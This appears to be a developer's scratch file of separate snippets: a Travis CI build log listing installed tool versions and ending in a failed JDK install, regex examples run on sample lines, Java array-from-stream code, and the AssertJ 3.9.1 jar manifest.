* ra_serf : Module for accessing a repository via WebDAV protocol using serf.
  - using serf 1.3.3
  - handles 'http' scheme
  - handles 'https' scheme
sudo version
Sudo version 1.8.9p5
Configure options: --prefix=/usr -v --with-all-insults --with-pam --with-fqdn --with-logging=syslog --with-logfac=authpriv --with-env-editor --with-editor=/usr/bin/editor --with-timeout=15 --with-password-timeout=0 --with-passprompt=[sudo] password for %p:  --without-lecture --with-tty-tickets --disable-root-mailer --enable-admin-flag --with-sendmail=/usr/sbin/sendmail --with-timedir=/var/lib/sudo --mandir=/usr/share/man --libexecdir=/usr/lib/sudo --with-sssd --with-sssd-lib=/usr/lib/x86_64-linux-gnu --with-selinux
Sudoers policy plugin version 1.8.9p5
Sudoers file grammar version 43
Sudoers path: /etc/sudoers
Authentication methods: 'pam'
Syslog facility if syslog is being used for logging: authpriv
Syslog priority to use when user authenticates successfully: notice
Syslog priority to use when user authenticates unsuccessfully: alert
Send mail if the user is not in sudoers
Use a separate timestamp for each user/tty combo
Lecture user the first time they run sudo
Root may run sudo
Allow some information gathering to give useful error messages
Require fully-qualified hostnames in the sudoers file
Visudo will honor the EDITOR environment variable
Set the LOGNAME and USER environment variables
Length at which to wrap log file lines (0 for no wrap): 80
Authentication timestamp timeout: 15.0 minutes
Password prompt timeout: 0.0 minutes
Number of tries to enter a password: 3
Umask to use or 0777 to use user's: 022
Path to mail program: /usr/sbin/sendmail
Flags for mail program: -t
Address to send mail to: root
Subject line for mail messages: *** SECURITY information for %h ***
Incorrect password message: Sorry, try again.
Path to authentication timestamp dir: /var/lib/sudo
Default password prompt: [sudo] password for %p: 
Default user to run commands as: root
Value to override user's $PATH with: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
Path to the editor for use by visudo: /usr/bin/editor
When to require a password for 'list' pseudocommand: any
When to require a password for 'verify' pseudocommand: all
File descriptors >= 3 will be closed before executing a command
Environment variables to check for sanity:
	TZ
	TERM
	LINGUAS
	LC_*
	LANGUAGE
	LANG
	COLORTERM
Environment variables to remove:
	RUBYOPT
	RUBYLIB
	PYTHONUSERBASE
	PYTHONINSPECT
	PYTHONPATH
	PYTHONHOME
	TMPPREFIX
	ZDOTDIR
	READNULLCMD
	NULLCMD
	FPATH
	PERL5DB
	PERL5OPT
	PERL5LIB
	PERLLIB
	PERLIO_DEBUG 
	JAVA_TOOL_OPTIONS
	SHELLOPTS
	GLOBIGNORE
	PS4
	BASH_ENV
	ENV
	TERMCAP
	TERMPATH
	TERMINFO_DIRS
	TERMINFO
	_RLD*
	LD_*
	PATH_LOCALE
	NLSPATH
	HOSTALIASES
	RES_OPTIONS
	LOCALDOMAIN
	CDPATH
	IFS
Environment variables to preserve:
	JAVA_HOME
	TRAVIS
	CI
	DEBIAN_FRONTEND
	XAUTHORIZATION
	XAUTHORITY
	PS2
	PS1
	PATH
	LS_COLORS
	KRB5CCNAME
	HOSTNAME
	HOME
	DISPLAY
	COLORS
Locale to use while parsing sudoers: C
Directory in which to store input/output logs: /var/log/sudo-io
File in which to store the input/output log: %{seq}
Add an entry to the utmp/utmpx file when allocating a pty
PAM service name to use
PAM service name to use for login shells
Create a new PAM session for the command to run in
Maximum I/O log sequence number: 0
Local IP address and netmask pairs:
	10.240.0.28/255.255.255.255
	172.17.0.1/255.255.0.0
Sudoers I/O plugin version 1.8.9p5
gzip version
gzip 1.6
Copyright (C) 2007, 2010, 2011 Free Software Foundation, Inc.
Copyright (C) 1993 Jean-loup Gailly.
This is free software.  You may redistribute copies of it under the terms of
the GNU General Public License <http://www.gnu.org/licenses/gpl.html>.
There is NO WARRANTY, to the extent permitted by law.
Written by Jean-loup Gailly.
zip version
Copyright (c) 1990-2008 Info-ZIP - Type 'zip "-L"' for software license.
This is Zip 3.0 (July 5th 2008), by Info-ZIP.
Currently maintained by E. Gordon.  Please send bug reports to
the authors using the web page at www.info-zip.org; see README for details.
Latest sources and executables are at ftp://ftp.info-zip.org/pub/infozip,
as of above date; see http://www.info-zip.org/ for other sites.
Compiled with gcc 4.8.2 for Unix (Linux ELF) on Oct 21 2013.
Zip special compilation options:
	USE_EF_UT_TIME       (store Universal Time)
	BZIP2_SUPPORT        (bzip2 library version 1.0.6, 6-Sept-2010)
	    bzip2 code and library copyright (c) Julian R Seward
	    (See the bzip2 license for terms of use)
	SYMLINK_SUPPORT      (symbolic links supported)
	LARGE_FILE_SUPPORT   (can read and write large files on file system)
	ZIP64_SUPPORT        (use Zip64 to store large files in archives)
	UNICODE_SUPPORT      (store and read UTF-8 Unicode paths)
	STORE_UNIX_UIDs_GIDs (store UID/GID sizes/values using new extra field)
	UIDGID_NOT_16BIT     (old Unix 16-bit UID/GID extra field not used)
	[encryption, version 2.91 of 05 Jan 2007] (modified for Zip 3)
Encryption notice:
	The encryption code of this program is not copyrighted and is
	put in the public domain.  It was originally written in Europe
	and, to the best of our knowledge, can be freely distributed
	in both source and object forms from any country, including
	the USA under License Exception TSU of the U.S. Export
	Administration Regulations (section 740.13(e)) of 6 June 2002.
Zip environment options:
             ZIP:  [none]
          ZIPOPT:  [none]
vim version
VIM - Vi IMproved 7.4 (2013 Aug 10, compiled Nov 24 2016 16:43:18)
Included patches: 1-52
Extra patches: 8.0.0056
Modified by pkg-vim-maintainers@lists.alioth.debian.org
Compiled by buildd@
Huge version without GUI.  Features included (+) or not (-):
+acl             +farsi           +mouse_netterm   +syntax
+arabic          +file_in_path    +mouse_sgr       +tag_binary
+autocmd         +find_in_path    -mouse_sysmouse  +tag_old_static
-balloon_eval    +float           +mouse_urxvt     -tag_any_white
-browse          +folding         +mouse_xterm     -tcl
++builtin_terms  -footer          +multi_byte      +terminfo
+byte_offset     +fork()          +multi_lang      +termresponse
+cindent         +gettext         -mzscheme        +textobjects
-clientserver    -hangul_input    +netbeans_intg   +title
-clipboard       +iconv           +path_extra      -toolbar
+cmdline_compl   +insert_expand   -perl            +user_commands
+cmdline_hist    +jumplist        +persistent_undo +vertsplit
+cmdline_info    +keymap          +postscript      +virtualedit
+comments        +langmap         +printer         +visual
+conceal         +libcall         +profile         +visualextra
+cryptv          +linebreak       +python          +viminfo
+cscope          +lispindent      -python3         +vreplace
+cursorbind      +listcmds        +quickfix        +wildignore
+cursorshape     +localmap        +reltime         +wildmenu
+dialog_con      -lua             +rightleft       +windows
+diff            +menu            -ruby            +writebackup
+digraphs        +mksession       +scrollbind      -X11
-dnd             +modify_fname    +signs           -xfontset
-ebcdic          +mouse           +smartindent     -xim
+emacs_tags      -mouseshape      -sniff           -xsmp
+eval            +mouse_dec       +startuptime     -xterm_clipboard
+ex_extra        +mouse_gpm       +statusline      -xterm_save
+extra_search    -mouse_jsbterm   -sun_workshop    -xpm
   system vimrc file: "$VIM/vimrc"
     user vimrc file: "$HOME/.vimrc"
 2nd user vimrc file: "~/.vim/vimrc"
      user exrc file: "$HOME/.exrc"
  fall-back for $VIM: "/usr/share/vim"
Compilation: gcc -c -I. -Iproto -DHAVE_CONFIG_H     -g -O2 -fstack-protector --param=ssp-buffer-size=4 -Wformat -Werror=format-security -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=1      
Linking: gcc   -Wl,-Bsymbolic-functions -Wl,-z,relro -Wl,--as-needed -o vim        -lm -ltinfo -lnsl  -lselinux  -lacl -lattr -lgpm -ldl    -L/usr/lib/python2.7/config-x86_64-linux-gnu -lpython2.7 -lpthread -ldl -lutil -lm -Xlinker -export-dynamic -Wl,-O1 -Wl,-Bsymbolic-functions      
iptables version
iptables v1.4.21
curl version
curl 7.35.0 (x86_64-pc-linux-gnu) libcurl/7.35.0 OpenSSL/1.0.1f zlib/1.2.8 libidn/1.28 librtmp/2.3
wget version
GNU Wget 1.15 built on linux-gnu.
rsync version
rsync  version 3.1.0  protocol version 31
gimme version
v1.2.0
nvm version
0.33.6
perlbrew version
/home/travis/perl5/perlbrew/bin/perlbrew  - App::perlbrew/0.80
phpenv version
rbenv 1.1.1-25-g6aa70b6
rvm version
rvm 1.29.3 (latest) by Michal Papis, Piotr Kuczynski, Wayne E. Seguin [https://rvm.io]
default ruby version
ruby 2.4.1p111 (2017-03-22 revision 58053) [x86_64-linux]
CouchDB version
couchdb 1.6.1
ElasticSearch version
5.5.0
Installed Firefox version
firefox 56.0.2
MongoDB version
MongoDB 3.4.10
PhantomJS version
2.1.1
Pre-installed PostgreSQL versions
9.2.24
9.3.20
9.4.15
9.5.10
9.6.6
RabbitMQ Version
3.6.14
Redis version
redis-server 4.0.6
riak version
2.2.3
Pre-installed Go versions
1.7.4
ant version
Apache Ant(TM) version 1.9.3 compiled on April 8 2014
mvn version
Apache Maven 3.5.2 (138edd61fd100ec658bfa2d307c43b76940a5d7d; 2017-10-18T07:58:13Z)
Maven home: /usr/local/maven-3.5.2
Java version: 1.8.0_151, vendor: Oracle Corporation
Java home: /usr/lib/jvm/java-8-oracle/jre
Default locale: en_US, platform encoding: UTF-8
OS name: "linux", version: "4.4.0-98-generic", arch: "amd64", family: "unix"
gradle version
------------------------------------------------------------
Gradle 4.0.1
------------------------------------------------------------
Build time:   2017-07-07 14:02:41 UTC
Revision:     38e5dc0f772daecca1d2681885d3d85414eb6826
Groovy:       2.4.11
Ant:          Apache Ant(TM) version 1.9.6 compiled on June 29 2015
JVM:          1.8.0_151 (Oracle Corporation 25.151-b12)
OS:           Linux 4.4.0-98-generic amd64
lein version
Leiningen 2.8.1 on Java 1.8.0_151 Java HotSpot(TM) 64-Bit Server VM
Pre-installed Node.js versions
v4.8.6
v6.12.0
v6.12.1
v8.9
v8.9.1
phpenv versions
  system
  5.6
* 5.6.32 (set by /home/travis/.phpenv/version)
  7.0
  7.0.25
  7.1
  7.1.11
  hhvm
  hhvm-stable
composer --version
Composer version 1.5.2 2017-09-11 16:59:25
Pre-installed Ruby versions
ruby-2.2.7
ruby-2.3.4
ruby-2.4.1
docker_mtu
docker stop/waiting
docker start/running, process 4483
resolvconf
resolvconf stop/waiting
resolvconf start/running
Installing openjdk11
$ export JAVA_HOME=~/openjdk11
$ export PATH="$JAVA_HOME/bin:$PATH"
$ ~/bin/install-jdk.sh --target "/home/travis/openjdk11" --workspace "/home/travis/.cache/install-jdk" --feature "11" --license "GPL" --cacerts
install-jdk.sh 2019-05-02
The command "~/bin/install-jdk.sh --target "/home/travis/openjdk11" --workspace "/home/travis/.cache/install-jdk" --feature "11" --license "GPL" --cacerts" failed and exited with 7 during .
Your build has been stopped.
--------------------------------------------------------------------------------------------------------
Line 1
Line 2
Line 3
Line 4
This expression --- is contained in this line 5
Line 6
Line 7
Line 8
WORD begins that line 9
Line 10
Line 11
Line 12

\A(?s).*?WORD(?-s).*\R
\A(?s).*WORD(?-s).*\R
(?s).*?WORD(?-s).*\R
(?s).*WORD(?-s).*\R
(?s-i).*\R\K.*WORD.*

(?<=Name\s).*(?=\sAge)
\A(?s)(.*?)\K(WORD)

    Count((?-s)^.{N,}) give all lines containing, at least, N character(s)
    Count ((?-s)^.{M,N}$) give all lines containing, between M and N character(s)
    Count ((?-s)^.{1,N}$) give all lines containing, at most, N characters(s)
--------------------------------------------------------------------------------------------------------
C[] cs = (C[]) new Object[as.length];
Arrays.setAll(cs, i -> op.apply(as[i], bs[i]));

C[] cs = (C[])IntStream.range(0, as.length)
                       .mapToObj(i -> op.apply(as[i], bs[i]))
                       .toArray();
--------------------------------------------------------------------------------------------------------
String[] stringArray = stringStream.toArray(String[]::new);
--------------------------------------------------------------------------------------------------------
Manifest-Version: 1.0
Build-Jdk: 1.8.0_161
Built-By: joel
Bundle-Description: Rich and fluent assertions for testing for Java
Bundle-DocURL: joel-costigliola.github.io/assertj/index.html
Bundle-License: http://www.apache.org/licenses/LICENSE-2.0.txt
Bundle-ManifestVersion: 2
Bundle-Name: AssertJ fluent assertions
Bundle-RequiredExecutionEnvironment: JavaSE-1.8
Bundle-SymbolicName: org.assertj.core
Bundle-Vendor: AssertJ
Bundle-Version: 3.9.1
Created-By: Apache Maven Bundle Plugin
Export-Package: org.assertj.core.api;version="3.9.1";uses:="org.assertj.
 core.api.filter,org.assertj.core.api.iterable,org.assertj.core.conditio
 n,org.assertj.core.data,org.assertj.core.description,org.assertj.core.e
 rror,org.assertj.core.groups,org.assertj.core.internal,org.assertj.core
 .internal.bytebuddy.implementation.bind.annotation,org.assertj.core.pre
 sentation",org.assertj.core.api.exception;version="3.9.1",org.assertj.c
 ore.api.filter;version="3.9.1";uses:="org.assertj.core.api",org.assertj
 .core.api.iterable;version="3.9.1",org.assertj.core.condition;version="
 3.9.1";uses:="org.assertj.core.api",org.assertj.core.configuration;vers
 ion="3.9.1";uses:="org.assertj.core.presentation",org.assertj.core.data
 ;version="3.9.1",org.assertj.core.description;version="3.9.1",org.asser
 tj.core.error;version="3.9.1";uses:="org.assertj.core.api,org.assertj.c
 ore.data,org.assertj.core.description,org.assertj.core.groups,org.asser
 tj.core.internal,org.assertj.core.presentation,org.assertj.core.util.di
 ff",org.assertj.core.error.future;version="3.9.1";uses:="org.assertj.co
 re.error",org.assertj.core.error.uri;version="3.9.1";uses:="org.assertj
 .core.error",org.assertj.core.extractor;version="3.9.1";uses:="org.asse
 rtj.core.api.iterable,org.assertj.core.groups",org.assertj.core.groups;
 version="3.9.1";uses:="org.assertj.core.api.iterable",org.assertj.core.
 internal;uses:="org.assertj.core.api,org.assertj.core.data,org.assertj.
 core.error,org.assertj.core.presentation,org.assertj.core.util.diff";ve
 rsion="3.9.1",org.assertj.core.internal.bytebuddy;uses:="org.assertj.co
 re.internal.bytebuddy.description.method,org.assertj.core.internal.byte
 buddy.description.type,org.assertj.core.internal.bytebuddy.dynamic,org.
 assertj.core.internal.bytebuddy.dynamic.scaffold,org.assertj.core.inter
 nal.bytebuddy.dynamic.scaffold.inline,org.assertj.core.internal.bytebud
 dy.dynamic.scaffold.subclass,org.assertj.core.internal.bytebuddy.implem
 entation,org.assertj.core.internal.bytebuddy.implementation.attribute,o
 rg.assertj.core.internal.bytebuddy.implementation.auxiliary,org.assertj
 .core.internal.bytebuddy.implementation.bytecode,org.assertj.core.inter
 nal.bytebuddy.jar.asm,org.assertj.core.internal.bytebuddy.matcher";vers
 ion="3.9.1",org.assertj.core.internal.bytebuddy.agent.builder;uses:="or
 g.assertj.core.internal.bytebuddy,org.assertj.core.internal.bytebuddy.a
 sm,org.assertj.core.internal.bytebuddy.build,org.assertj.core.internal.
 bytebuddy.description.field,org.assertj.core.internal.bytebuddy.descrip
 tion.method,org.assertj.core.internal.bytebuddy.description.type,org.as
 sertj.core.internal.bytebuddy.dynamic,org.assertj.core.internal.bytebud
 dy.dynamic.loading,org.assertj.core.internal.bytebuddy.dynamic.scaffold
 ,org.assertj.core.internal.bytebuddy.dynamic.scaffold.inline,org.assert
 j.core.internal.bytebuddy.implementation,org.assertj.core.internal.byte
 buddy.implementation.bytecode,org.assertj.core.internal.bytebuddy.imple
 mentation.bytecode.assign,org.assertj.core.internal.bytebuddy.jar.asm,o
 rg.assertj.core.internal.bytebuddy.matcher,org.assertj.core.internal.by
 tebuddy.pool,org.assertj.core.internal.bytebuddy.utility";version="3.9.
 1",org.assertj.core.internal.bytebuddy.asm;uses:="org.assertj.core.inte
 rnal.bytebuddy,org.assertj.core.internal.bytebuddy.description,org.asse
 rtj.core.internal.bytebuddy.description.annotation,org.assertj.core.int
 ernal.bytebuddy.description.enumeration,org.assertj.core.internal.byteb
 uddy.description.field,org.assertj.core.internal.bytebuddy.description.
 method,org.assertj.core.internal.bytebuddy.description.modifier,org.ass
 ertj.core.internal.bytebuddy.description.type,org.assertj.core.internal
 .bytebuddy.dynamic,org.assertj.core.internal.bytebuddy.dynamic.scaffold
 ,org.assertj.core.internal.bytebuddy.implementation,org.assertj.core.in
 ternal.bytebuddy.implementation.bytecode,org.assertj.core.internal.byte
 buddy.implementation.bytecode.assign,org.assertj.core.internal.bytebudd
 y.jar.asm,org.assertj.core.internal.bytebuddy.matcher,org.assertj.core.
 internal.bytebuddy.pool,org.assertj.core.internal.bytebuddy.utility.vis
 itor";version="3.9.1",org.assertj.core.internal.bytebuddy.build;uses:="
 org.assertj.core.internal.bytebuddy,org.assertj.core.internal.bytebuddy
 .description.type,org.assertj.core.internal.bytebuddy.dynamic,org.asser
 tj.core.internal.bytebuddy.dynamic.scaffold.inline,org.assertj.core.int
 ernal.bytebuddy.matcher";version="3.9.1",org.assertj.core.internal.byte
 buddy.description;uses:="org.assertj.core.internal.bytebuddy.descriptio
 n.annotation,org.assertj.core.internal.bytebuddy.description.method,org
 .assertj.core.internal.bytebuddy.description.modifier,org.assertj.core.
 internal.bytebuddy.description.type,org.assertj.core.internal.bytebuddy
 .matcher";version="3.9.1",org.assertj.core.internal.bytebuddy.descripti
 on.annotation;uses:="org.assertj.core.internal.bytebuddy.description.en
 umeration,org.assertj.core.internal.bytebuddy.description.method,org.as
 sertj.core.internal.bytebuddy.description.type,org.assertj.core.interna
 l.bytebuddy.matcher";version="3.9.1",org.assertj.core.internal.bytebudd
 y.description.enumeration;uses:="org.assertj.core.internal.bytebuddy.de
 scription,org.assertj.core.internal.bytebuddy.description.type";version
 ="3.9.1",org.assertj.core.internal.bytebuddy.description.field;uses:="o
 rg.assertj.core.internal.bytebuddy.description,org.assertj.core.interna
 l.bytebuddy.description.annotation,org.assertj.core.internal.bytebuddy.
 description.type,org.assertj.core.internal.bytebuddy.matcher";version="
 3.9.1",org.assertj.core.internal.bytebuddy.description.method;uses:="or
 g.assertj.core.internal.bytebuddy.description,org.assertj.core.internal
 .bytebuddy.description.annotation,org.assertj.core.internal.bytebuddy.d
 escription.modifier,org.assertj.core.internal.bytebuddy.description.typ
 e,org.assertj.core.internal.bytebuddy.matcher";version="3.9.1",org.asse
 rtj.core.internal.bytebuddy.description.modifier;version="3.9.1",org.as
 sertj.core.internal.bytebuddy.description.type;uses:="org.assertj.core.
 internal.bytebuddy.description,org.assertj.core.internal.bytebuddy.desc
 ription.annotation,org.assertj.core.internal.bytebuddy.description.fiel
 d,org.assertj.core.internal.bytebuddy.description.method,org.assertj.co
 re.internal.bytebuddy.implementation.bytecode,org.assertj.core.internal
 .bytebuddy.jar.asm.signature,org.assertj.core.internal.bytebuddy.matche
 r";version="3.9.1",org.assertj.core.internal.bytebuddy.dynamic;uses:="o
 rg.assertj.core.internal.bytebuddy,org.assertj.core.internal.bytebuddy.
 asm,org.assertj.core.internal.bytebuddy.description,org.assertj.core.in
 ternal.bytebuddy.description.annotation,org.assertj.core.internal.byteb
 uddy.description.field,org.assertj.core.internal.bytebuddy.description.
 method,org.assertj.core.internal.bytebuddy.description.modifier,org.ass
 ertj.core.internal.bytebuddy.description.type,org.assertj.core.internal
 .bytebuddy.dynamic.loading,org.assertj.core.internal.bytebuddy.dynamic.
 scaffold,org.assertj.core.internal.bytebuddy.implementation,org.assertj
 .core.internal.bytebuddy.implementation.attribute,org.assertj.core.inte
 rnal.bytebuddy.implementation.auxiliary,org.assertj.core.internal.byteb
 uddy.implementation.bytecode,org.assertj.core.internal.bytebuddy.jar.as
 m,org.assertj.core.internal.bytebuddy.matcher,org.assertj.core.internal
 .bytebuddy.pool,org.assertj.core.internal.bytebuddy.utility";version="3
 .9.1",org.assertj.core.internal.bytebuddy.dynamic.loading;uses:="org.as
 sertj.core.internal.bytebuddy.description.type,org.assertj.core.interna
 l.bytebuddy.dynamic,org.assertj.core.internal.bytebuddy.matcher,org.ass
 ertj.core.internal.bytebuddy.utility";version="3.9.1",org.assertj.core.
 internal.bytebuddy.dynamic.scaffold;uses:="org.assertj.core.internal.by
 tebuddy,org.assertj.core.internal.bytebuddy.asm,org.assertj.core.intern
 al.bytebuddy.description.annotation,org.assertj.core.internal.bytebuddy
 .description.field,org.assertj.core.internal.bytebuddy.description.meth
 od,org.assertj.core.internal.bytebuddy.description.modifier,org.assertj
 .core.internal.bytebuddy.description.type,org.assertj.core.internal.byt
 ebuddy.dynamic,org.assertj.core.internal.bytebuddy.dynamic.scaffold.inl
 ine,org.assertj.core.internal.bytebuddy.implementation,org.assertj.core
 .internal.bytebuddy.implementation.attribute,org.assertj.core.internal.
 bytebuddy.implementation.auxiliary,org.assertj.core.internal.bytebuddy.
 implementation.bytecode,org.assertj.core.internal.bytebuddy.jar.asm,org
 .assertj.core.internal.bytebuddy.matcher,org.assertj.core.internal.byte
 buddy.pool";version="3.9.1",org.assertj.core.internal.bytebuddy.dynamic
 .scaffold.inline;uses:="org.assertj.core.internal.bytebuddy,org.assertj
 .core.internal.bytebuddy.asm,org.assertj.core.internal.bytebuddy.descri
 ption.annotation,org.assertj.core.internal.bytebuddy.description.method
 ,org.assertj.core.internal.bytebuddy.description.type,org.assertj.core.
 internal.bytebuddy.dynamic,org.assertj.core.internal.bytebuddy.dynamic.
 scaffold,org.assertj.core.internal.bytebuddy.implementation,org.assertj
 .core.internal.bytebuddy.implementation.attribute,org.assertj.core.inte
 rnal.bytebuddy.implementation.auxiliary,org.assertj.core.internal.byteb
 uddy.implementation.bytecode,org.assertj.core.internal.bytebuddy.jar.as
 m,org.assertj.core.internal.bytebuddy.matcher,org.assertj.core.internal
 .bytebuddy.pool";version="3.9.1",org.assertj.core.internal.bytebuddy.dy
 namic.scaffold.subclass;uses:="org.assertj.core.internal.bytebuddy,org.
 assertj.core.internal.bytebuddy.asm,org.assertj.core.internal.bytebuddy
 .description.method,org.assertj.core.internal.bytebuddy.description.typ
 e,org.assertj.core.internal.bytebuddy.dynamic,org.assertj.core.internal
 .bytebuddy.dynamic.scaffold,org.assertj.core.internal.bytebuddy.impleme
 ntation,org.assertj.core.internal.bytebuddy.implementation.attribute,or
 g.assertj.core.internal.bytebuddy.implementation.auxiliary,org.assertj.
 core.internal.bytebuddy.matcher,org.assertj.core.internal.bytebuddy.poo
 l";version="3.9.1",org.assertj.core.internal.bytebuddy.implementation;u
 ses:="org.assertj.core.internal.bytebuddy,org.assertj.core.internal.byt
 ebuddy.description.annotation,org.assertj.core.internal.bytebuddy.descr
 iption.enumeration,org.assertj.core.internal.bytebuddy.description.fiel
 d,org.assertj.core.internal.bytebuddy.description.method,org.assertj.co
 re.internal.bytebuddy.description.modifier,org.assertj.core.internal.by
 tebuddy.description.type,org.assertj.core.internal.bytebuddy.dynamic,or
 g.assertj.core.internal.bytebuddy.dynamic.scaffold,org.assertj.core.int
 ernal.bytebuddy.implementation.attribute,org.assertj.core.internal.byte
 buddy.implementation.auxiliary,org.assertj.core.internal.bytebuddy.impl
 ementation.bind,org.assertj.core.internal.bytebuddy.implementation.bind
 .annotation,org.assertj.core.internal.bytebuddy.implementation.bytecode
 ,org.assertj.core.internal.bytebuddy.implementation.bytecode.assign,org
 .assertj.core.internal.bytebuddy.jar.asm,org.assertj.core.internal.byte
 buddy.matcher,org.assertj.core.internal.bytebuddy.utility";version="3.9
 .1",org.assertj.core.internal.bytebuddy.implementation.attribute;uses:=
 "org.assertj.core.internal.bytebuddy.description.annotation,org.assertj
 .core.internal.bytebuddy.description.field,org.assertj.core.internal.by
 tebuddy.description.method,org.assertj.core.internal.bytebuddy.descript
 ion.type,org.assertj.core.internal.bytebuddy.jar.asm";version="3.9.1",o
 rg.assertj.core.internal.bytebuddy.implementation.auxiliary;uses:="org.
 assertj.core.internal.bytebuddy,org.assertj.core.internal.bytebuddy.des
 cription.method,org.assertj.core.internal.bytebuddy.description.modifie
 r,org.assertj.core.internal.bytebuddy.description.type,org.assertj.core
 .internal.bytebuddy.dynamic,org.assertj.core.internal.bytebuddy.dynamic
 .scaffold,org.assertj.core.internal.bytebuddy.implementation,org.assert
 j.core.internal.bytebuddy.implementation.bytecode,org.assertj.core.inte
 rnal.bytebuddy.implementation.bytecode.assign,org.assertj.core.internal
 .bytebuddy.jar.asm";version="3.9.1",org.assertj.core.internal.bytebuddy
 .implementation.bind;uses:="org.assertj.core.internal.bytebuddy.descrip
 tion.method,org.assertj.core.internal.bytebuddy.description.type,org.as
 sertj.core.internal.bytebuddy.implementation,org.assertj.core.internal.
 bytebuddy.implementation.bytecode,org.assertj.core.internal.bytebuddy.i
 mplementation.bytecode.assign,org.assertj.core.internal.bytebuddy.jar.a
 sm";version="3.9.1",org.assertj.core.internal.bytebuddy.implementation.
 bind.annotation;uses:="org.assertj.core.internal.bytebuddy,org.assertj.
 core.internal.bytebuddy.description.annotation,org.assertj.core.interna
 l.bytebuddy.description.field,org.assertj.core.internal.bytebuddy.descr
 iption.method,org.assertj.core.internal.bytebuddy.description.type,org.
 assertj.core.internal.bytebuddy.dynamic,org.assertj.core.internal.byteb
 uddy.dynamic.scaffold,org.assertj.core.internal.bytebuddy.implementatio
 n,org.assertj.core.internal.bytebuddy.implementation.auxiliary,org.asse
 rtj.core.internal.bytebuddy.implementation.bind,org.assertj.core.intern
 al.bytebuddy.implementation.bytecode,org.assertj.core.internal.bytebudd
 y.implementation.bytecode.assign,org.assertj.core.internal.bytebuddy.ja
 r.asm";version="3.9.1",org.assertj.core.internal.bytebuddy.implementati
 on.bytecode;uses:="org.assertj.core.internal.bytebuddy.description.meth
 od,org.assertj.core.internal.bytebuddy.description.type,org.assertj.cor
 e.internal.bytebuddy.implementation,org.assertj.core.internal.bytebuddy
 .jar.asm";version="3.9.1",org.assertj.core.internal.bytebuddy.implement
 ation.bytecode.assign;uses:="org.assertj.core.internal.bytebuddy.descri
 ption.type,org.assertj.core.internal.bytebuddy.implementation,org.asser
 tj.core.internal.bytebuddy.implementation.bytecode,org.assertj.core.int
 ernal.bytebuddy.jar.asm";version="3.9.1",org.assertj.core.internal.byte
 buddy.implementation.bytecode.assign.primitive;uses:="org.assertj.core.
 internal.bytebuddy.description.type,org.assertj.core.internal.bytebuddy
 .implementation,org.assertj.core.internal.bytebuddy.implementation.byte
 code,org.assertj.core.internal.bytebuddy.implementation.bytecode.assign
 ,org.assertj.core.internal.bytebuddy.jar.asm";version="3.9.1",org.asser
 tj.core.internal.bytebuddy.implementation.bytecode.assign.reference;use
 s:="org.assertj.core.internal.bytebuddy.description.type,org.assertj.co
 re.internal.bytebuddy.implementation.bytecode,org.assertj.core.internal
 .bytebuddy.implementation.bytecode.assign";version="3.9.1",org.assertj.
 core.internal.bytebuddy.implementation.bytecode.collection;uses:="org.a
 ssertj.core.internal.bytebuddy.description.type,org.assertj.core.intern
 al.bytebuddy.implementation,org.assertj.core.internal.bytebuddy.impleme
 ntation.bytecode,org.assertj.core.internal.bytebuddy.jar.asm";version="
 3.9.1",org.assertj.core.internal.bytebuddy.implementation.bytecode.cons
 tant;uses:="org.assertj.core.internal.bytebuddy.description.field,org.a
 ssertj.core.internal.bytebuddy.description.method,org.assertj.core.inte
 rnal.bytebuddy.description.type,org.assertj.core.internal.bytebuddy.imp
 lementation,org.assertj.core.internal.bytebuddy.implementation.bytecode
 ,org.assertj.core.internal.bytebuddy.jar.asm,org.assertj.core.internal.
 bytebuddy.utility";version="3.9.1",org.assertj.core.internal.bytebuddy.
 implementation.bytecode.member;uses:="org.assertj.core.internal.bytebud
 dy.description.enumeration,org.assertj.core.internal.bytebuddy.descript
 ion.field,org.assertj.core.internal.bytebuddy.description.method,org.as
 sertj.core.internal.bytebuddy.description.type,org.assertj.core.interna
 l.bytebuddy.implementation,org.assertj.core.internal.bytebuddy.implemen
 tation.bytecode,org.assertj.core.internal.bytebuddy.jar.asm,org.assertj
 .core.internal.bytebuddy.utility";version="3.9.1",org.assertj.core.inte
 rnal.bytebuddy.jar.asm;version="3.9.1",org.assertj.core.internal.bytebu
 ddy.jar.asm.commons;uses:="org.assertj.core.internal.bytebuddy.jar.asm,
 org.assertj.core.internal.bytebuddy.jar.asm.signature";version="3.9.1",
 org.assertj.core.internal.bytebuddy.jar.asm.signature;version="3.9.1",o
 rg.assertj.core.internal.bytebuddy.matcher;uses:="org.assertj.core.inte
 rnal.bytebuddy.description,org.assertj.core.internal.bytebuddy.descript
 ion.annotation,org.assertj.core.internal.bytebuddy.description.field,or
 g.assertj.core.internal.bytebuddy.description.method,org.assertj.core.i
 nternal.bytebuddy.description.type,org.assertj.core.internal.bytebuddy.
 utility";version="3.9.1",org.assertj.core.internal.bytebuddy.pool;uses:
 ="org.assertj.core.internal.bytebuddy.description,org.assertj.core.inte
 rnal.bytebuddy.description.annotation,org.assertj.core.internal.bytebud
 dy.description.enumeration,org.assertj.core.internal.bytebuddy.descript
 ion.field,org.assertj.core.internal.bytebuddy.description.method,org.as
 sertj.core.internal.bytebuddy.description.type,org.assertj.core.interna
 l.bytebuddy.dynamic,org.assertj.core.internal.bytebuddy.jar.asm,org.ass
 ertj.core.internal.bytebuddy.jar.asm.signature";version="3.9.1",org.ass
 ertj.core.internal.bytebuddy.utility;uses:="org.assertj.core.internal.b
 ytebuddy.description,org.assertj.core.internal.bytebuddy.description.fi
 eld,org.assertj.core.internal.bytebuddy.description.method,org.assertj.
 core.internal.bytebuddy.description.type,org.assertj.core.internal.byte
 buddy.implementation.bytecode";version="3.9.1",org.assertj.core.interna
 l.bytebuddy.utility.privilege;version="3.9.1",org.assertj.core.internal
 .bytebuddy.utility.visitor;uses:="org.assertj.core.internal.bytebuddy.d
 escription.method,org.assertj.core.internal.bytebuddy.implementation.by
 tecode,org.assertj.core.internal.bytebuddy.jar.asm";version="3.9.1",org
 .assertj.core.matcher;version="3.9.1",org.assertj.core.presentation;ver
 sion="3.9.1";uses:="org.assertj.core.data,org.assertj.core.groups",org.
 assertj.core.util;version="3.9.1";uses:="org.assertj.core.api.filter,or
 g.assertj.core.presentation",org.assertj.core.util.diff;version="3.9.1"
 ,org.assertj.core.util.diff.myers;version="3.9.1";uses:="org.assertj.co
 re.util.diff",org.assertj.core.util.introspection;version="3.9.1",org.a
 ssertj.core.util.xml;version="3.9.1"
